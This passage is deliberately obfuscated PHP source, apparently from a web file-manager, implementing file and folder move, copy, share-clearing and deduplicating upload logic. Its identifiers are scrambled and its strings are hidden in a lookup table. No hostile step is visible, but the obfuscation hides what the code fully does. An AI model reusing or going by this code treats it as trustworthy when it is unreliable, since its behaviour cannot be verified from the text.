$this->targetIsDelete = intval($ Şêû¦ï[$¡ıÎÕçÍ[482]]); if ($ Şêû¦ï[$¡ıÎÕçÍ[190]] == $Ü‹ˆ¦¢Ó && $¾é‘ñëş != $ Şêû¦ï[$¡ıÎÕçÍ[42]]) { $úÃî½Àì = $this->fileNameExist($Ü‹ˆ¦¢Ó, $¾é‘ñëş); if ($úÃî½Àì && $ Şêû¦ï[$¡ıÎÕçÍ[462]] == $¡ıÎÕçÍ[222]) { $á¤•—Ğ£ = $this->sourceInfo($úÃî½Àì); $™± ŸŸ¨ = $this->fileHistory($á¤•—Ğ£, $ Şêû¦ï[$¡ıÎÕçÍ[518]], $ Şêû¦ï[$¡ıÎÕçÍ[86]]); if (!$™± ŸŸ¨) { Model($¡ıÎÕçÍ[521])->remove($ Şêû¦ï[$¡ıÎÕçÍ[518]]); } $this->removeNow($¾Ë·‰€Œ, !1); $this->folderSizeReset($Ü‹ˆ¦¢Ó); Hook::trigger($¡ıÎÕçÍ[636], $ ÅÒÍ€å); return $úÃî½Àì; } } $³Ü®­© = $¾é‘ñëş ? $¾é‘ñëş : $ Şêû¦ï[$¡ıÎÕçÍ[42]]; $this->lockMoveStart($¾Ë·‰€Œ); $this->lockWriteStart($Ü‹ˆ¦¢Ó, $³Ü®­©); $Ğ¾›§Ö = array($¡ıÎÕçÍ[606] => array(), $¡ıÎÕçÍ[637] => !1); $this->clearShare($¾Ë·‰€Œ, $Ü‹ˆ¦¢Ó); $×ÙŠƒ«ô = $this->fileNameExistAuto($Ü‹ˆ¦¢Ó, $ Şêû¦ï); $Ò©á—«÷ = $this->_move($¾Ë·‰€Œ, $Ü‹ˆ¦¢Ó, $…®ô¿·«, $Ğ¾›§Ö, $¾é‘ñëş); $this->sourceCacheClear(); if ($ Şêû¦ï[$¡ıÎÕçÍ[462]] == $¡ıÎÕçÍ[98] && $×ÙŠƒ«ô) { $this->folderSizeResetChildren($Ò©á—«÷); } Model($¡ıÎÕçÍ[224])->linkAdd($Ğ¾›§Ö[$¡ıÎÕçÍ[606]]); if ($×ÙŠƒ«ô && $Ğ¾›§Ö[$¡ıÎÕçÍ[637]]) { $this->removeNow($¾Ë·‰€Œ, !1); } $this->lockMoveEnd($¾Ë·‰€Œ); $this->lockWriteEnd($Ü‹ˆ¦¢Ó, $³Ü®­©); $this->folderSizeReset($ Şêû¦ï[$¡ıÎÕçÍ[190]]); $this->folderSizeReset($Ü‹ˆ¦¢Ó); $¥§Û·ü± = array($ Şêû¦ï[$¡ıÎÕçÍ[190]], $Ü‹ˆ¦¢Ó); if ($ Şêû¦ï[$¡ıÎÕçÍ[462]] == $¡ıÎÕçÍ[98]) { $¥§Û·ü±[] = $¾Ë·‰€Œ; } $this->updateModifyTime($¥§Û·ü±); Model($¡ıÎÕçÍ[610])->eventMove($¾Ë·‰€Œ, $ Şêû¦ï[$¡ıÎÕçÍ[190]], $Ü‹ˆ¦¢Ó); Hook::trigger($¡ıÎÕçÍ[636], $ ÅÒÍ€å); return $Ò©á—«÷; } private function _move($½›‚Æêî, $Àò˜Âš, $ÈÇÃÂ, &$ğ‘õ£éí, $ÇœêƒòÓ = '') { $ê¨ÙæÍ¡ =& $_SERVER[ú÷îèÆÜ]; $Ô«Ô†°¬ = $this->sourceInfo($½›‚Æêî); $íæİÓá¤ = $Ô«Ô†°¬[$ê¨ÙæÍ¡[462]] == $ê¨ÙæÍ¡[98]; $˜†èßÂ¢ = $ÇœêƒòÓ ? $ÇœêƒòÓ : $Ô«Ô†°¬[$ê¨ÙæÍ¡[42]]; $ƒØğ¢¨ = $this->fileNameExistAuto($Àò˜Âš, $Ô«Ô†°¬); $this->lockMoveStart($½›‚Æêî); $this->lockWriteStart($Àò˜Âš, $˜†èßÂ¢); if (!$ƒØğ¢¨) { return $this->_moveForce($½›‚Æêî, $Àò˜Âš, $˜†èßÂ¢); } $è»ÒŠ‡Ë = $ƒØğ¢¨; $ù‡Œ•¸… = !1; if ($íæİÓá¤) { if ($ÈÇÃÂ == REPEAT_RENAME_FOLDER) { $˜†èßÂ¢ = $this->fileNameAuto($Àò˜Âš, $˜†èßÂ¢, $ÈÇÃÂ, $íæİÓá¤); $è»ÒŠ‡Ë = $this->_moveForce($½›‚Æêî, $Àò˜Âš, $˜†èßÂ¢); } else { if ($ÈÇÃÂ == REPEAT_RENAME_FOLDER) { $ÈÇÃÂ = REPEAT_RENAME; } $è«èÎ”ô = $this->_childrenListSelect($½›‚Æêî); foreach ($è«èÎ”ô as $½ì…ì“Ø) { $this->_move($½ì…ì“Ø[$ê¨ÙæÍ¡[191]], $ƒØğ¢¨, $ÈÇÃÂ, $ğ‘õ£éí); } $ù‡Œ•¸… = !0; } } else { if ($ÈÇÃÂ == REPEAT_SKIP) { $ù‡Œ•¸… = !0; } else { if ($ÈÇÃÂ == REPEAT_RENAME || $ÈÇÃÂ == REPEAT_RENAME_FOLDER) { $˜†èßÂ¢ = $this->fileNameAuto($Àò˜Âš, $˜†èßÂ¢, $ÈÇÃÂ, $íæİÓá¤); $è»ÒŠ‡Ë = $this->_moveForce($½›‚Æêî, $Àò˜Âš, $˜†èßÂ¢); } else { if ($ÈÇÃÂ == REPEAT_REPLACE) { $ºĞ©ĞÍÎ = $this->sourceInfoCache($ƒØğ¢¨); $«›åÌÓç = $this->fileHistory($ºĞ©ĞÍÎ, $Ô«Ô†°¬[$ê¨ÙæÍ¡[518]], $Ô«Ô†°¬[$ê¨ÙæÍ¡[86]]); $ù‡Œ•¸… = !0; if ($«›åÌÓç) { $ğ‘õ£éí[$ê¨ÙæÍ¡[606]][] = $Ô«Ô†°¬[$ê¨ÙæÍ¡[518]]; } } } } } if ($ù‡Œ•¸… && !$ğ‘õ£éí[$ê¨ÙæÍ¡[637]]) { $ğ‘õ£éí[$ê¨ÙæÍ¡[637]] = !0; } return $è»ÒŠ‡Ë; } private function _moveForce($ÓÙ°€òÀ, $íó“¶Ú…, $Ùè«¨ú) { $òÁ›„Şù =& $_SERVER[ú÷îèÆÜ]; $›š³ñ©± = $this->sourceInfo($ÓÙ°€òÀ); $Ùàó‘Èú = $this->sourceInfo($íó“¶Ú…); $•¤ÌÂ£” = $›š³ñ©±[$òÁ›„Şù[462]] == $òÁ›„Şù[98]; $úãŞõ–é = array($òÁ›„Şù[454] => $Ùàó‘Èú[$òÁ›„Şù[191]], $òÁ›„Şù[629] => $Ùàó‘Èú[$òÁ›„Şù[562]] . $Ùàó‘Èú[$òÁ›„Şù[191]] . $òÁ›„Şù[60], $òÁ›„Şù[625] => $Ùàó‘Èú[$òÁ›„Şù[188]], $òÁ›„Şù[626] => $Ùàó‘Èú[$òÁ›„Şù[547]], $òÁ›„Şù[628] => USER_ID, $òÁ›„Şù[471] => $Ùè«¨ú); $–¯ĞÀ– = $›š³ñ©±[$òÁ›„Şù[188]] == SourceModel::TYPE_GROUP && $Ùàó‘Èú[$òÁ›„Şù[188]] == SourceModel::TYPE_GROUP && $›š³ñ©±[$òÁ›„Şù[547]] == $Ùàó‘Èú[$òÁ›„Şù[547]]; if (!$–¯ĞÀ– && $this->moveClearAuth) { Model($òÁ›„Şù[544])->authClear($ÓÙ°€òÀ); } $Ù—”Àğ÷ = $›š³ñ©±[$òÁ›„Şù[482]] == $òÁ›„Şù[98] && $Ùàó‘Èú[$òÁ›„Şù[482]] != $òÁ›„Şù[98]; if ($Ù—”Àğ÷) { $úãŞõ–é[$òÁ›„Şù[481]] = 0; } if ($•¤ÌÂ£”) { $ë€ç¹ù¤ = array($òÁ›„Şù[629] => array($òÁ›„Şù[589], $›š³ñ©±[$òÁ›„Şù[562]] . $›š³ñ©±[$òÁ›„Şù[191]] . $òÁ›„Şù[590])); $ŠÏ×åòŸ = $›š³ñ©±[$òÁ›„Şù[562]] . $›š³ñ©±[$òÁ›„Şù[191]] . $òÁ›„Şù[60]; $²§çœ—å = $Ùàó‘Èú[$òÁ›„Şù[562]] . $Ùàó‘Èú[$òÁ›„Şù[191]] . $òÁ›„Şù[60] . $›š³ñ©±[$òÁ›„Şù[191]] . $òÁ›„Şù[60]; $¾—Òí‘¨ = array($òÁ›„Şù[629] => array($òÁ›„Şù[638], "\x72\145\160\154\141\143\x65\x28\160\x61\162\x65\x6e\x74\114\x65\x76\x65\x6c\54\x27{$ŠÏ×åòŸ}\x27\54\x27{$²§çœ—å}\47\x29"), $òÁ›„Şù[625] => $Ùàó‘Èú[$òÁ›„Şù[188]], $òÁ›„Şù[626] => $Ùàó‘Èú[$òÁ›„Şù[547]]); if ($Ù—”Àğ÷) { $¾—Òí‘¨[$òÁ›„Şù[481]] = 0; } $this->where($ë€ç¹ù¤)->data($¾—Òí‘¨)->save(); } $this->where(array($òÁ›„Şù[468] => $ÓÙ°€òÀ))->data($úãŞõ–é)->save(); return $ÓÙ°€òÀ; } private function clearShare($³¼¼é³Ö, $Í‡ÂÛÎ») { $ÌÛÎú“´ =& $_SERVER[ú÷îèÆÜ]; $Ê›©»¦Ş = $this->sourceInfo($³¼¼é³Ö); $šûš—¹ = $this->sourceInfo($Í‡ÂÛÎ»); if ($Ê›©»¦Ş[$ÌÛÎú“´[547]] == $šûš—¹[$ÌÛÎú“´[547]] && $Ê›©»¦Ş[$ÌÛÎú“´[188]] == $ÌÛÎú“´[639]) { return; } $¹ĞØç = array($ÌÛÎú“´[562] => array($ÌÛÎú“´[589], $Ê›©»¦Ş[$ÌÛÎú“´[562]] . $³¼¼é³Ö . $ÌÛÎú“´[590])); $Èİßˆ®¬ = $this->field($ÌÛÎú“´[468])->where($¹ĞØç)->getField($ÌÛÎú“´[191], !0); if (!$Èİßˆ®¬) { return; } $¹ĞØç = array($ÌÛÎú“´[191] => array($ÌÛÎú“´[17], $Èİßˆ®¬), $ÌÛÎú“´[640] => 1); $•ºŸĞó = Model($ÌÛÎú“´[641])->field($ÌÛÎú“´[642])->where($¹ĞØç)->select(); if (!$•ºŸĞó) { return; } $•ºŸĞó = array_to_keyvalue($•ºŸĞó, $ÌÛÎú“´[22], $ÌÛÎú“´[642]); $¹ĞØç = array($ÌÛÎú“´[642] => array($ÌÛÎú“´[17], $•ºŸĞó)); Model($ÌÛÎú“´[641])->where($¹ĞØç)->save(array($ÌÛÎú“´[640] => 0)); Model($ÌÛÎú“´[643])->where($¹ĞØç)->delete(); } public function copyFolderFromIO($Ùı«’›, $Ù¼ºª“ü, $½¯¢˜, $äÊÉ¢´¢, $öôµ‰‰½, $š“–Ëªç = false) { $·²øÓÄš =& $_SERVER[ú÷îèÆÜ]; $Ë‡ö§ÖÇ = array($·²øÓÄš[607] => array(), $·²øÓÄš[608] => array(), $·²øÓÄš[606] => array(), $·²øÓÄš[644] => array()); $‚Óíƒç£ = $š“–Ëªç ? $š“–Ëªç : $Ùı«’›->pathThis($Ù¼ºª“ü); $Æ¦“±ëä = $this->fileNameExist($½¯¢˜, $‚Óíƒç£); $£‚Šª—¾ = $this->mkdir($½¯¢˜, $‚Óíƒç£, $äÊÉ¢´¢); if (!$Æ¦“±ëä || $äÊÉ¢´¢ == REPEAT_RENAME_FOLDER) { $äÊÉ¢´¢ = !1; } if ($Æ¦“±ëä) { $this->_childrenAllMake($Æ¦“±ëä); } Hook::trigger($·²øÓÄš[645]); $this->_copyChildTo($Ùı«’›, $Ù¼ºª“ü, $£‚Šª—¾, $äÊÉ¢´¢, $Ë‡ö§ÖÇ, $öôµ‰‰½); Hook::trigger($·²øÓÄš[646]); if ($£‚Šª—¾) { $this->folderSizeResetChildren($£‚Šª—¾); } $this->_childrenListClear(); Model($·²øÓÄš[609])->addAll($Ë‡ö§ÖÇ[$·²øÓÄš[607]], array(), !0); Model($·²øÓÄš[610])->eventCopy($£‚Šª—¾); $this->saveAll($Ë‡ö§ÖÇ[$·²øÓÄš[608]]); Model($·²øÓÄš[521])->linkAdd($Ë‡ö§ÖÇ[$·²øÓÄš[606]]); Model($·²øÓÄš[521])->remove($Ë‡ö§ÖÇ[$·²øÓÄš[644]]); $this->folderSizeReset($½¯¢˜); $this->updateModifyTime($½¯¢˜); return $£‚Šª—¾; } private function _copyChildTo($º–˜Ó´, $·öå´ã­, $Ù¨¤ÎÒ, $‚Ó”¿ê…, &$Ã–Ğªüî, $¶ˆ¬ÌĞ) { $¼‹±à§­ =& $_SERVER[ú÷îèÆÜ]; $Á¿³‰´Ô = $this->sourceInfoCache($Ù¨¤ÎÒ); $”İœ¦Ÿ  = $º–˜Ó´->listPath($·öå´ã­); $”İœ¦Ÿ  = $”İœ¦Ÿ  ? $”İœ¦Ÿ  : array($¼‹±à§­[93] => array(), $¼‹±à§­[92] => array()); $óîÜıæ = array_merge($”İœ¦Ÿ [$¼‹±à§­[93]], $”İœ¦Ÿ [$¼‹±à§­[92]]); $¼‡÷ÒãÁ = $this->_addFiles($º–˜Ó´, $”İœ¦Ÿ [$¼‹±à§­[93]], $¶ˆ¬ÌĞ); $¢‡âÍó = array(); foreach ($óîÜıæ as &$´ÀÎÖÈ£) { if (isset($¼‡÷ÒãÁ[$´ÀÎÖÈ£[$¼‹±à§­[42]]])) { $´ÀÎÖÈ£ = $¼‡÷ÒãÁ[$´ÀÎÖÈ£[$¼‹±à§­[42]]]; } $´ÀÎÖÈ£[$¼‹±à§­[462]] = $´ÀÎÖÈ£[$¼‹±à§­[43]] == $¼‹±à§­[85]; $´ÀÎÖÈ£[$¼‹±à§­[463]] = substr(_get($´ÀÎÖÈ£, $¼‹±à§­[185], $¼‹±à§­[22]), 0, 10); $´ÀÎÖÈ£[$¼‹±à§­[86]] = _get($´ÀÎÖÈ£, $¼‹±à§­[86], 0); $´ÀÎÖÈ£[$¼‹±à§­[518]] = _get($´ÀÎÖÈ£, $¼‹±à§­[518], 0); if (!isset($´ÀÎÖÈ£[$¼‹±à§­[647]]) && $´ÀÎÖÈ£[$¼‹±à§­[518]]) { $Ã–Ğªüî[$¼‹±à§­[644]][] = $´ÀÎÖÈ£[$¼‹±à§­[518]]; } if ($‚Ó”¿ê…) { $ÇÏºĞıš = $this->fileNameExistCache($Ù¨¤ÎÒ, $´ÀÎÖÈ£[$¼‹±à§­[42]]); if ($ÇÏºĞıš) { if ($´ÀÎÖÈ£[$¼‹±à§­[462]] || $‚Ó”¿ê… == REPEAT_SKIP) { continue; } if ($‚Ó”¿ê… == REPEAT_REPLACE) { $½™ÖºÛß = $this->sourceInfoCache($ÇÏºĞıš); $Óùµ›€  = $this->fileHistory($½™ÖºÛß, $´ÀÎÖÈ£[$¼‹±à§­[518]], $´ÀÎÖÈ£[$¼‹±à§­[86]]); if ($Óùµ›€ ) { $Ã–Ğªüî[$¼‹±à§­[606]][] = $´ÀÎÖÈ£[$¼‹±à§­[518]]; } continue; } else { if ($‚Ó”¿ê… == REPEAT_RENAME) { $´ÀÎÖÈ£[$¼‹±à§­[42]] = $this->fileNameAutoCache($Ù¨¤ÎÒ, $´ÀÎÖÈ£[$¼‹±à§­[42]], $‚Ó”¿ê…, !1); } } } } if (!$´ÀÎÖÈ£[$¼‹±à§­[462]] && $´ÀÎÖÈ£[$¼‹±à§­[518]] == 0) { continue; } if (!$´ÀÎÖÈ£[$¼‹±à§­[462]] && $´ÀÎÖÈ£[$¼‹±à§­[518]]) { $Ã–Ğªüî[$¼‹±à§­[606]][] = $´ÀÎÖÈ£[$¼‹±à§­[518]]; } $¢‡âÍó[] = $this->_makeItemData($´ÀÎÖÈ£, $Á¿³‰´Ô, $´ÀÎÖÈ£[$¼‹±à§­[42]]); } unset($´ÀÎÖÈ£); if (!empty($¢‡âÍó)) { $this->addAll($¢‡âÍó); $this->_childrenListSelect($Ù¨¤ÎÒ); } $âìáÁö = $this->_childrenList($Ù¨¤ÎÒ); $âìáÁö = array_to_keyvalue($âìáÁö, $¼‹±à§­[42]); foreach ($óîÜıæ as $´ÀÎÖÈ£) { $½™ÖºÛß = $âìáÁö[$´ÀÎÖÈ£[$¼‹±à§­[42]]]; $ÓÉîÂô = $½™ÖºÛß[$¼‹±à§­[191]]; $this->_copyApplyMeta($½™ÖºÛß, $Ã–Ğªüî); if ($´ÀÎÖÈ£[$¼‹±à§­[43]] == $¼‹±à§­[85]) { $´ÀÎÖÈ£[$¼‹±à§­[94]] = $º–˜Ó´->getPathInner($´ÀÎÖÈ£[$¼‹±à§­[94]]); $this->_copyChildTo($º–˜Ó´, $´ÀÎÖÈ£[$¼‹±à§­[94]], $ÓÉîÂô, $‚Ó”¿ê…, $Ã–Ğªüî, $¶ˆ¬ÌĞ); } } } private function _addFiles($ãÃù“—Ò, $ùá¢Ë¬§, $†¾¨ÆÕª) { $ŞªÔÜÅ© =& $_SERVER[ú÷îèÆÜ]; if (!$ùá¢Ë¬§ || count($ùá¢Ë¬§) == 0) { return array(); } $‹ş¸„ºÏ = array(); foreach ($ùá¢Ë¬§ as &$İéê±º) { Hook::trigger($ŞªÔÜÅ©[648], $İéê±º); $İéê±º[$ŞªÔÜÅ©[94]] = $ãÃù“—Ò->getPathInner($İéê±º[$ŞªÔÜÅ©[94]]); $‡¶ÕšÏ = $ãÃù“—Ò->hashSimple($İéê±º[$ŞªÔÜÅ©[94]]); $úÀ¸Ë = $ãÃù“—Ò->hashMd5($İéê±º[$ŞªÔÜÅ©[94]]); if (strlen($úÀ¸Ë) > 10 && !isset($‹ş¸„ºÏ[$úÀ¸Ë])) { $‹ş¸„ºÏ[$úÀ¸Ë] = array(); } $İéê±º[$ŞªÔÜÅ©[649]] = $‡¶ÕšÏ; $İéê±º[$ŞªÔÜÅ©[650]] = $úÀ¸Ë; $‹ş¸„ºÏ[$úÀ¸Ë][] =& $İéê±º; if (count($‹ş¸„ºÏ[$úÀ¸Ë]) > 1) { $İéê±º[$ŞªÔÜÅ©[647]] = !0; } Hook::trigger($ŞªÔÜÅ©[651], $İéê±º); } unset($İéê±º); $·ŸÜ°¦¡ = array($ŞªÔÜÅ©[650] => array($ŞªÔÜÅ©[17], array_keys($‹ş¸„ºÏ))); $ Êìèó¼ = Model($ŞªÔÜÅ©[652]); $ƒµ™½ï = $ Êìèó¼->where($·ŸÜ°¦¡)->select(); $ƒµ™½ï = $ƒµ™½ï ? $ƒµ™½ï : array(); foreach ($ƒµ™½ï as $ÛäË­Ã) { if (!isset($‹ş¸„ºÏ[$ÛäË­Ã[$ŞªÔÜÅ©[650]]])) { continue; } $‡¬”ôüµ = $‹ş¸„ºÏ[$ÛäË­Ã[$ŞªÔÜÅ©[650]]]; foreach ($‡¬”ôüµ as &$İéê±º) { $İéê±º[$ŞªÔÜÅ©[518]] = $ÛäË­Ã[$ŞªÔÜÅ©[518]]; $İéê±º[$ŞªÔÜÅ©[647]] = !0; } unset($İéê±º); } $û—˜êëŠ = array(); foreach ($ùá¢Ë¬§ as $Šî“¹Ê) { Hook::trigger($ŞªÔÜÅ©[653], $Šî“¹Ê); if (isset($Šî“¹Ê[$ŞªÔÜÅ©[647]]) && $Šî“¹Ê[$ŞªÔÜÅ©[647]]) { Hook::trigger($ŞªÔÜÅ©[654], $Šî“¹Ê); continue; } $ÚèÛß²§ = $ãÃù“—Ò->getPathInner($Šî“¹Ê[$ŞªÔÜÅ©[94]]); $¨ÔŞÎ¦ô = $ Êìèó¼->addFileMake($ÚèÛß²§, $Šî“¹Ê[$ŞªÔÜÅ©[86]], $Šî“¹Ê[$ŞªÔÜÅ©[649]], $Šî“¹Ê[$ŞªÔÜÅ©[650]], $Šî“¹Ê[$ŞªÔÜÅ©[42]], $†¾¨ÆÕª); Hook::trigger($ŞªÔÜÅ©[654], $Šî“¹Ê); if (!is_array($¨ÔŞÎ¦ô)) { continue; } $û—˜êëŠ[] = $¨ÔŞÎ¦ô; } $ Êìèó¼->addAll($û—˜êëŠ); $·ŸÜ°¦¡ = array($ŞªÔÜÅ©[650] => array($ŞªÔÜÅ©[17], array_keys($‹ş¸„ºÏ))); $ƒµ™½ï = $ Êìèó¼->where($·ŸÜ°¦¡)->select(); $ƒµ™½ï = $ƒµ™½ï ? $ƒµ™½ï : array(); foreach ($ƒµ™½ï as $ÛäË­Ã) { if (!isset($‹ş¸„ºÏ[$ÛäË­Ã[$ŞªÔÜÅ©[650]]])) { continue; } $Öæ‚ÂÑÔ =& $‹ş¸„ºÏ[$ÛäË­Ã[$ŞªÔÜÅ©[650]]]; foreach ($Öæ‚ÂÑÔ as &$İéê±º) { $İéê±º[$ŞªÔÜÅ©[518]] = $ÛäË­Ã[$ŞªÔÜÅ©[518]]; } unset($İéê±º); } $£ˆÊ²ì— = array(); foreach ($ùá¢Ë¬§ as $ŒÏ³¦Éì) { $£ˆÊ²ì—[$ŒÏ³¦Éì[$ŞªÔÜÅ©[42]]] = $ŒÏ³¦Éì; } return $£ˆÊ²ì—; } } define($_SERVER[ú÷îèÆÜ][655], $_SERVER[ú÷îèÆÜ][656]); $wiljtgcdpa = $_SERVER[ú÷îèÆÜ][657]; goto B„”¦À»Ù; DŞÃé¢¼˜ß: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¥›¾¦¾, $ÔÊì“²ƒ) { $úéÃØÃ =& $_SERVER[ú÷îèÆÜ]; $ºæœ÷êì = $ÔÊì“²ƒ; $GLOBALS[$úéÃØÃ[1187]] = $úéÃØÃ[1188] . $¥›¾¦¾; Hook::trigger($úéÃØÃ[1188] . $¥›¾¦¾ . $úéÃØÃ[1189], $ºæœ÷êì); $©ƒúÀé = self::driverMake($ÔÊì“²ƒ[0]); if (!$©ƒúÀé) { return !1; } if (method_exists($©ƒúÀé, $¥›¾¦¾)) { $ôæ¸–ë¼ = @call_user_func_array(array($©ƒúÀé, $¥›¾¦¾), $ÔÊì“²ƒ); } else { if (method_exists($©ƒúÀé, $úéÃØÃ[1190])) { $ôæ¸–ë¼ = @call_user_func_array(array($©ƒúÀé, $¥›¾¦¾), $ÔÊì“²ƒ); } else { if (method_exists(self, $¥›¾¦¾)) { $ôæ¸–ë¼ = @call_user_func_array(array(self, $¥›¾¦¾), $ÔÊì“²ƒ); } else { $ôæ¸–ë¼ = call_user_func_array(array(parent, $¥›¾¦¾), $ÔÊì“²ƒ); } } } Hook::trigger($úéÃØÃ[1188] . $¥›¾¦¾ . $úéÃØÃ[1191], $ºæœ÷êì, $ôæ¸–ë¼); return $ôæ¸–ë¼; } public static function init($Ö›Ô›Õ’) { return self::driverMake($Ö›Ô›Õ’); } public static function copy($üïÔõì¢, $ƒÎ“±°¹, $±±äœ•ñ = false, $ ¾åİ = false) { return self::copyMoveStart($üïÔõì¢, $ƒÎ“±°¹, $±±äœ•ñ, $_SERVER[ú÷îèÆÜ][595], $ ¾åİ); } public static function move($÷š‚£…•, $£“îí½Ÿ, $ûşè©à = false, $Ù¯à˜¾ = false) { return self::copyMoveStart($÷š‚£…•, $£“îí½Ÿ, $ûşè©à, $_SERVER[ú÷îèÆÜ][597], $Ù¯à˜¾); } private static function copyMoveStart($ı¶á¶€“, $Õ¡Ÿî´, $¾ïÕ÷Å½, $±… Õ‹, $«ïÁÂà) { $çŞÖÆÏ =& $_SERVER[ú÷îèÆÜ]; $ĞÙø˜ãª = array($ı¶á¶€“, $Õ¡Ÿî´, $¾ïÕ÷Å½, $«ïÁÂà); Hook::trigger($çŞÖÆÏ[1188] . $±… Õ‹ . $çŞÖÆÏ[1189], $ĞÙø˜ãª); $Êİõ·³ª = self::copyMove($ı¶á¶€“, $Õ¡Ÿî´, $¾ïÕ÷Å½, $±… Õ‹, $«ïÁÂà); Hook::trigger($çŞÖÆÏ[1188] . $±… Õ‹ . $çŞÖÆÏ[1191], $ĞÙø˜ãª, $Êİõ·³ª); return $Êİõ·³ª; } public static function saveFile($é™Ããû•, $ğ¿Ä, $ñŠå¹»€ = true) { $å³úËÇ =& $_SERVER[ú÷îèÆÜ]; $«–“™•ş = self::info($ğ¿Ä); $œ˜£Ç°Ñ = self::driverMake($é™Ããû•); $óÜ­ÎµÃ = self::driverMake($ğ¿Ä); $ŸÔ÷¹„‰ = !1; if ($óÜ­ÎµÃ->pathParse[$å³úËÇ[1192]]) { $ŸÔ÷¹„‰ = $óÜ­ÎµÃ; $½¦†õºŞ = $óÜ­ÎµÃ->pathParse[$å³úËÇ[1192]]; $óÜ­ÎµÃ = self::driverMake($½¦†õºŞ); } if ($œ˜£Ç°Ñ->pathParse[$å³úËÇ[1192]]) { $¦ìªâ§× = $œ˜£Ç°Ñ->pathParse[$å³úËÇ[1192]]; $œ˜£Ç°Ñ = self::driverMake($¦ìªâ§×); } $Ç…Ç„î  = $óÜ­ÎµÃ->pathFather($ğ¿Ä); $Ö ºˆ­å = !0; if (!$ñŠå¹»€ && self::driverIsSame($œ˜£Ç°Ñ, $óÜ­ÎµÃ)) { $Ö ºˆ­å = !1; } $§éöúÄÏ = self::copyFile($œ˜£Ç°Ñ, $é™Ããû•, $óÜ­ÎµÃ, $Ç…Ç„î , $«–“™•ş[$å³úËÇ[42]], $Ö ºˆ­å); if ($ŸÔ÷¹„‰) { $§éöúÄÏ = $ŸÔ÷¹„‰->getPathOuter($§éöúÄÏ); } return $§éöúÄÏ; } private static function copyMove($›Çı¢­ä, $«ÖÀÆŞÕ, $ı¦ÈÈêß, $¦Ï“ö­·, $àŒÎ˜×™ = false) { $Ë„™ÙÇ =& $_SERVER[ú÷îèÆÜ]; if (!$›Çı¢­ä || $›Çı¢­ä == $Ë„™ÙÇ[18] || !$«ÖÀÆŞÕ) { return !1; } ignore_timeout(); $æĞØ‹¾÷ = self::driverMake($›Çı¢­ä); $¿¾ÖûÑÈ = self::driverMake($«ÖÀÆŞÕ); $š÷òª¼Ö = $¦Ï“ö­· == $Ë„™ÙÇ[597]; $´×Ï‡úÆ = !1; if ($¿¾ÖûÑÈ->pathParse[$Ë„™ÙÇ[1192]]) { $´×Ï‡úÆ = $¿¾ÖûÑÈ; $«ÖÀÆŞÕ = $¿¾ÖûÑÈ->pathParse[$Ë„™ÙÇ[1192]]; $¿¾ÖûÑÈ = self::driverMake($«ÖÀÆŞÕ); } if ($æĞØ‹¾÷->pathParse[$Ë„™ÙÇ[1192]]) { $›Çı¢­ä = $æĞØ‹¾÷->pathParse[$Ë„™ÙÇ[1192]]; $æĞØ‹¾÷ = self::driverMake($›Çı¢­ä); } self::check($æĞØ‹¾÷, $›Çı¢­ä, $¿¾ÖûÑÈ, $«ÖÀÆŞÕ); Hook::trigger($Ë„™ÙÇ[1193], $æĞØ‹¾÷, $›Çı¢­ä, $¿¾ÖûÑÈ, $«ÖÀÆŞÕ); $¨£•€éê = self::driverIsSame($æĞØ‹¾÷, $¿¾ÖûÑÈ); if ($¨£•€éê) { if ($¦Ï“ö­· == $Ë„™ÙÇ[597] && !method_exists($¿¾ÖûÑÈ, $Ë„™ÙÇ[1194]) && trim($«ÖÀÆŞÕ, $Ë„™ÙÇ[18]) == trim($¿¾ÖûÑÈ->pathFather($›Çı¢­ä), $Ë„™ÙÇ[18])) { if ($æĞØ‹¾÷->pathThis($›Çı¢­ä) != $àŒÎ˜×™ && !$æĞØ‹¾÷->isTypeObject()) { return $æĞØ‹¾÷->rename($›Çı¢­ä, $àŒÎ˜×™); } return $¿¾ÖûÑÈ->getPathOuter($›Çı¢­ä); } if (method_exists($¿¾ÖûÑÈ, $¦Ï“ö­·)) { return $¿¾ÖûÑÈ->{$¦Ï“ö­·}($›Çı¢­ä, $«ÖÀÆŞÕ, $ı¦ÈÈêß, $àŒÎ˜×™); } } if ($¨£•€éê && $¦Ï“ö­· == $Ë„™ÙÇ[597] && $¿¾ÖûÑÈ->getType() == $Ë„™ÙÇ[116]) { $×Ä“Õ˜° = $¿¾ÖûÑÈ->movePath($›Çı¢­ä, $«ÖÀÆŞÕ, $àŒÎ˜×™); if ($×Ä“Õ˜°) { return $×Ä“Õ˜°; } } $ìÈ›€†‡ = $æĞØ‹¾÷->isFile($›Çı¢­ä); if (!$ìÈ›€†‡ && $¿¾ÖûÑÈ->getType() == $Ë„™ÙÇ[797] && $æĞØ‹¾÷->getType() == $Ë„™ÙÇ[116]) { $×Ä“Õ˜° = $¿¾ÖûÑÈ->copyFolderFromIO($æĞØ‹¾÷, $›Çı¢­ä, $«ÖÀÆŞÕ, $ı¦ÈÈêß, $š÷òª¼Ö, $àŒÎ˜×™); } else { $×Ä“Õ˜° = self::copyPath($æĞØ‹¾÷, $›Çı¢­ä, $¿¾ÖûÑÈ, $«ÖÀÆŞÕ, $ı¦ÈÈêß, $š÷òª¼Ö, $ìÈ›€†‡, $àŒÎ˜×™); } if ($×Ä“Õ˜° && $š÷òª¼Ö) { $æĞØ‹¾÷->remove($›Çı¢­ä); } if ($´×Ï‡úÆ) { $×Ä“Õ˜° = $´×Ï‡úÆ->getPathOuter($×Ä“Õ˜°); } return $×Ä“Õ˜°; } private static function check($„úİ©¡ó, $–ÑÏÆÄà, $ßÄß»½, &$ÙªÚÕÊ¸) { $´×­ı¸¼ =& $_SERVER[ú÷îèÆÜ]; if (self::driverIsSame($„úİ©¡ó, $ßÄß»½) && $„úİ©¡ó->isFolder($–ÑÏÆÄà) && $„úİ©¡ó->isParentOf($–ÑÏÆÄà, $ÙªÚÕÊ¸)) { show_json(LNG($´×­ı¸¼[1195]), !1); } if (!$„úİ©¡ó->exist($–ÑÏÆÄà)) { show_json(LNG($´×­ı¸¼[115]), !1); } } private static function copyPath($¥À³ƒ—°, $ Èº‡»», $†ÌÑêäÅ, $ü¥²‚äÓ, $Å¥ÛéÈ, $÷¸Î§², $Á‚âµôˆ, $«Ôœµ†À = false, $ğññ§åá = true) { $¡¬Ìä–è =& $_SERVER[ú÷îèÆÜ]; $Ë°Êíâ¸ = empty($«Ôœµ†À) && $«Ôœµ†À !== $¡¬Ìä–è[222] ? $¥À³ƒ—°->pathThis($ Èº‡»») : 